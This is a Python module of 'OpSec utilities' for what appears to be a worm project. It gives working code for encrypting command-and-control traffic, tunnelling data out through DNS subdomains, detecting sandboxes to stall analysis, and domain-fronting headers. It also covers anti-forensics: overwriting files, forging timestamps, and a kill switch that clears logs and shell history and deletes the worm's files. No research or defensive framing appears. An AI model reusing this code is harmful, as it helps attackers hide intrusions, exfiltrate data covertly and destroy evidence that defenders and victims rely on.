#!/usr/bin/env python3
"""
Operational Security Utilities
Additional anti-detection and evasion techniques
"""

import os
import sys
import random
import time
import socket
import struct
import hashlib
from typing import Optional, List
from datetime import datetime
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes

from uniroam import config

# ============================================================================
# Traffic Encryption & Obfuscation
# ============================================================================

class TrafficEncryption:
    """Encrypt C2 traffic beyond TLS"""
    
    @staticmethod
    def generate_session_key() -> bytes:
        """Generate random session key"""
        return get_random_bytes(32)
    
    @staticmethod
    def encrypt_message(message: bytes, key: bytes = None) -> bytes:
        """
        Encrypt message with AES-GCM
        
        Args:
            message: Plain message
            key: Encryption key (uses default if None)
        
        Returns:
            Encrypted message with nonce and tag
        """
        if key is None:
            key = config.AES_KEY
        
        # Use AES-GCM for authenticated encryption
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(message)
        
        # Return: nonce + tag + ciphertext
        return cipher.nonce + tag + ciphertext
    
    @staticmethod
    def decrypt_message(encrypted: bytes, key: bytes = None) -> bytes:
        """
        Decrypt AES-GCM message
        
        Args:
            encrypted: Encrypted message
            key: Decryption key
        
        Returns:
            Decrypted message
        """
        if key is None:
            key = config.AES_KEY
        
        # Extract components
        nonce = encrypted[:16]
        tag = encrypted[16:32]
        ciphertext = encrypted[32:]
        
        # Decrypt
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)
    
    @staticmethod
    def obfuscate_traffic(data: bytes) -> bytes:
        """
        Add random padding to obfuscate traffic patterns
        
        Args:
            data: Data to obfuscate
        
        Returns:
            Obfuscated data
        """
        # Add random padding
        padding_size = random.randint(10, 100)
        padding = get_random_bytes(padding_size)
        
        # Prepend padding size and padding
        return struct.pack('!H', padding_size) + padding + data
    
    @staticmethod
    def deobfuscate_traffic(obfuscated: bytes) -> bytes:
        """
        Remove padding from traffic
        
        Args:
            obfuscated: Obfuscated data
        
        Returns:
            Original data
        """
        # Extract padding size
        padding_size = struct.unpack('!H', obfuscated[:2])[0]
        
        # Return data without padding
        return obfuscated[2 + padding_size:]

# ============================================================================
# DNS Tunneling (Covert Channel)
# ============================================================================

class DNSTunnel:
    """DNS tunneling for covert C2 communication"""
    
    @staticmethod
    def encode_in_subdomain(data: bytes, domain: str = None) -> str:
        """
        Encode data in DNS subdomain
        
        Args:
            data: Data to encode
            domain: Base domain
        
        Returns:
            DNS query string
        """
        if domain is None:
            domain = config.DNS_TUNNEL_DOMAIN
        
        # Encode as hex and split into subdomain labels
        hex_data = data.hex()
        
        # Split into 63-char chunks (DNS label limit)
        chunks = [hex_data[i:i+63] for i in range(0, len(hex_data), 63)]
        
        # Build DNS query
        subdomain = '.'.join(chunks)
        return f"{subdomain}.{domain}"
    
    @staticmethod
    def decode_from_subdomain(dns_query: str) -> bytes:
        """
        Decode data from DNS subdomain
        
        Args:
            dns_query: DNS query string
        
        Returns:
            Decoded data
        """
        # Extract subdomain
        parts = dns_query.split('.')
        
        # Remove base domain (last 2 parts)
        subdomain_parts = parts[:-2]
        
        # Reconstruct hex data
        hex_data = ''.join(subdomain_parts)
        
        return bytes.fromhex(hex_data)

# ============================================================================
# Timing Evasion
# ============================================================================

class TimingEvasion:
    """Evade detection through timing manipulation"""
    
    @staticmethod
    def jittered_sleep(base_duration: float, jitter_percent: float = 0.3):
        """
        Sleep with random jitter
        
        Args:
            base_duration: Base sleep duration in seconds
            jitter_percent: Jitter percentage (0.0 to 1.0)
        """
        jitter = base_duration * jitter_percent * (random.random() * 2 - 1)
        actual_duration = base_duration + jitter
        time.sleep(max(0, actual_duration))
    
    @staticmethod
    def is_analysis_environment() -> bool:
        """
        Detect if running in analysis/sandbox environment
        
        Returns:
            True if analysis environment detected
        """
        indicators = []
        
        # Check for common VM/sandbox indicators
        vm_files = [
            '/proc/scsi/scsi',  # Often contains VM info
            '/.dockerenv',       # Docker container
        ]
        
        for f in vm_files:
            if os.path.exists(f):
                indicators.append(True)
        
        # Check hostname for sandbox patterns
        hostname = socket.gethostname().lower()
        sandbox_patterns = ['sandbox', 'vm', 'virtual', 'analysis', 'cuckoo']
        
        if any(pattern in hostname for pattern in sandbox_patterns):
            indicators.append(True)
        
        # Check CPU count (VMs often have low CPU count)
        try:
            cpu_count = os.cpu_count()
            if cpu_count and cpu_count < 2:
                indicators.append(True)
        except:
            pass
        
        return len(indicators) >= 2  # Multiple indicators = likely sandbox
    
    @staticmethod
    def delay_if_sandbox(min_delay: int = 300):
        """
        Delay execution if sandbox detected
        
        Args:
            min_delay: Minimum delay in seconds
        """
        if TimingEvasion.is_analysis_environment():
            # Sleep long enough to exceed typical sandbox timeout
            time.sleep(min_delay + random.randint(0, 60))
    
    @staticmethod
    def business_hours_only() -> bool:
        """
        Check if current time is business hours (less suspicious)
        
        Returns:
            True if business hours
        """
        now = datetime.now()
        
        # Monday-Friday, 8 AM - 6 PM
        if now.weekday() < 5:  # Monday = 0, Friday = 4
            if 8 <= now.hour < 18:
                return True
        
        return False

# ============================================================================
# Network Evasion
# ============================================================================

class NetworkEvasion:
    """Evade network-based detection"""
    
    @staticmethod
    def get_random_user_agent() -> str:
        """Get random user agent string"""
        user_agents = [
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'curl/7.68.0',
            'python-requests/2.31.0',
        ]
        return random.choice(user_agents)
    
    @staticmethod
    def domain_fronting_headers(target_host: str) -> dict:
        """
        Generate headers for domain fronting
        
        Args:
            target_host: Actual C2 host
        
        Returns:
            HTTP headers dict
        """
        return {
            'Host': target_host,
            'User-Agent': NetworkEvasion.get_random_user_agent(),
            'Accept': '*/*',
            'Connection': 'keep-alive'
        }
    
    @staticmethod
    def slow_loris_request(duration: int = 60):
        """
        Slow-loris style request to evade IDS
        
        Args:
            duration: Request duration in seconds
        """
        # This would implement slow HTTP request technique
        pass

# ============================================================================
# Anti-Forensics
# ============================================================================

class AntiForensics:
    """Anti-forensics techniques"""
    
    @staticmethod
    def secure_delete(file_path: str, passes: int = 3) -> bool:
        """
        Securely delete file with multiple overwrites
        
        Args:
            file_path: Path to file
            passes: Number of overwrite passes
        
        Returns:
            True if successful
        """
        try:
            if not os.path.exists(file_path):
                return False
            
            # Get file size
            file_size = os.path.getsize(file_path)
            
            # Overwrite with random data multiple times
            with open(file_path, 'wb') as f:
                for _ in range(passes):
                    f.seek(0)
                    f.write(os.urandom(file_size))
                    f.flush()
                    os.fsync(f.fileno())
            
            # Finally delete
            os.remove(file_path)
            return True
        
        except Exception:
            return False
    
    @staticmethod
    def timestamp_manipulation(file_path: str, timestamp: Optional[float] = None):
        """
        Modify file timestamps to evade timeline analysis
        
        Args:
            file_path: Path to file
            timestamp: Unix timestamp (random old date if None)
        """
        if timestamp is None:
            # Set to random time in the past (1-365 days ago)
            days_ago = random.randint(1, 365)
            timestamp = time.time() - (days_ago * 24 * 60 * 60)
        
        try:
            os.utime(file_path, (timestamp, timestamp))
        except:
            pass
    
    @staticmethod
    def memory_cleanup():
        """Attempt to clean sensitive data from memory"""
        # Force garbage collection
        import gc
        gc.collect()
        
        # Overwrite sensitive variables
        # (In practice, Python strings are immutable, but this is best effort)
        for _ in range(10):
            _ = os.urandom(1024 * 1024)  # Allocate 1MB random data
        
        gc.collect()

# ============================================================================
# Kill Switch
# ============================================================================

class KillSwitch:
    """Emergency kill switch mechanisms"""
    
    @staticmethod
    def check_dead_mans_switch(last_c2_contact: datetime) -> bool:
        """
        Check if dead man's switch should trigger
        
        Args:
            last_c2_contact: Last successful C2 communication
        
        Returns:
            True if should trigger self-destruct
        """
        if not config.DEAD_MANS_SWITCH_ENABLED:
            return False
        
        time_since_contact = datetime.now() - last_c2_contact
        
        return time_since_contact > config.DEAD_MANS_SWITCH_INTERVAL
    
    @staticmethod
    def check_time_bomb() -> bool:
        """
        Check if time-based self-destruct should trigger
        
        Returns:
            True if should trigger
        """
        if config.SELF_DESTRUCT_DATE:
            return datetime.now() >= config.SELF_DESTRUCT_DATE
        
        return False
    
    @staticmethod
    def execute_kill_switch():
        """Execute emergency shutdown"""
        from persistence import cleanup_persistence, LogCleaner
        
        # Clean logs
        LogCleaner.clean_system_logs()
        LogCleaner.clear_bash_history()
        
        # Remove persistence
        cleanup_persistence()
        
        # Secure delete worm files
        if os.path.exists(config.WORM_INSTALL_PATH):
            AntiForensics.secure_delete(config.WORM_INSTALL_PATH)
        
        # Clear memory
        AntiForensics.memory_cleanup()
        
        # Exit
        sys.exit(0)

# ============================================================================
# OpSec Checklist
# ============================================================================

def run_opsec_checks() -> dict:
    """
    Run OpSec checklist
    
    Returns:
        Dict with check results
    """
    checks = {}
    
    # Check for sandbox
    checks['sandbox_detected'] = TimingEvasion.is_analysis_environment()
    
    # Check if running as root
    checks['is_root'] = os.geteuid() == 0 if hasattr(os, 'geteuid') else None
    
    # Check if persistence is installed
    checks['systemd_service_exists'] = os.path.exists(config.SYSTEMD_SERVICE_PATH)
    
    # Check network connectivity
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        checks['network_available'] = True
    except:
        checks['network_available'] = False
    
    return checks

# ============================================================================
# Testing
# ============================================================================

if __name__ == "__main__":
    print("="*60)
    print("OpSec Utilities Test")
    print("="*60)
    
    # Test encryption
    print("\n[+] Testing traffic encryption...")
    msg = b"Test C2 beacon data"
    encrypted = TrafficEncryption.encrypt_message(msg)
    decrypted = TrafficEncryption.decrypt_message(encrypted)
    print(f"    Encryption: {'PASS' if msg == decrypted else 'FAIL'}")
    
    # Test obfuscation
    print("\n[+] Testing traffic obfuscation...")
    obfuscated = TrafficEncryption.obfuscate_traffic(msg)
    deobfuscated = TrafficEncryption.deobfuscate_traffic(obfuscated)
    print(f"    Obfuscation: {'PASS' if msg == deobfuscated else 'FAIL'}")
    
    # Test DNS tunneling
    print("\n[+] Testing DNS tunneling...")
    dns_query = DNSTunnel.encode_in_subdomain(b"test_data")
    print(f"    DNS query: {dns_query}")
    
    # Test sandbox detection
    print("\n[+] Testing sandbox detection...")
    is_sandbox = TimingEvasion.is_analysis_environment()
    print(f"    Sandbox detected: {is_sandbox}")
    
    # Run OpSec checks
    print("\n[+] Running OpSec checklist...")
    checks = run_opsec_checks()
    for check, result in checks.items():
        print(f"    {check}: {result}")
    
    print("\n" + "="*60)

